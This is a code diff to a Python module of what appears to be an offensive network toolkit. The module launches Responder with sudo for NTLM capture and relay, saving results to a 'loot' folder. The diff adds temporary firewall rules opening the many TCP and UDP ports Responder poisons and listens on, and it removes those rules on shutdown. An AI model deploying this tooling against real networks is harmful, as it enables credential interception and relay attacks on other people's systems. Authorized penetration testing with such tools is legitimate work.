@@ -43,6 +43,7 @@ Loot: $CITYPOP_ROOT/loot/NTLMRelay/
 """
 
 from payloads._web_input import request_input
+from payloads._ufw import TemporaryUfwRules, interface_ipv4
 import os
 import sys
 import re
@@ -78,6 +79,7 @@ relay_successes = 0
 
 _responder_proc = None
 _iface = None
+_firewall = None
 
 # ---------------------------------------------------------------------------
 # Interface detection
@@ -166,7 +168,7 @@ def do_arp_scan():
 
 def _start_responder():
     """Start Responder in background."""
-    global _responder_proc, responder_running, status_msg
+    global _responder_proc, responder_running, status_msg, _firewall
 
     iface = _iface or _detect_default_iface()
 
@@ -180,6 +182,12 @@ def _start_responder():
         status_msg = "Starting Responder..."
 
     try:
+        _firewall = TemporaryUfwRules("ntlm-responder")
+        address = interface_ipv4(iface)
+        for port in (21, 25, 53, 80, 110, 139, 143, 389, 445, 587, 3128, 3141):
+            _firewall.allow_lan_service(address, port, "tcp")
+        for port in (53, 137, 138, 5353, 5355):
+            _firewall.allow_lan_service(address, port, "udp")
         _responder_proc = subprocess.Popen(
             ["sudo", "python3", RESPONDER_SCRIPT, "-I", iface, "-wrf"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -214,7 +222,7 @@ def _start_responder():
 
 def _stop_responder():
     """Stop Responder."""
-    global _responder_proc, responder_running, status_msg
+    global _responder_proc, responder_running, status_msg, _firewall
 
     with lock:
         responder_running = False
@@ -233,6 +241,9 @@ def _stop_responder():
     # Kill any remaining Responder processes
     subprocess.run(["sudo", "pkill", "-f", "Responder.py"],
                    capture_output=True, timeout=5)
+    if _firewall:
+        _firewall.close()
+        _firewall = None
 
     with lock:
         status_msg = "Responder stopped"
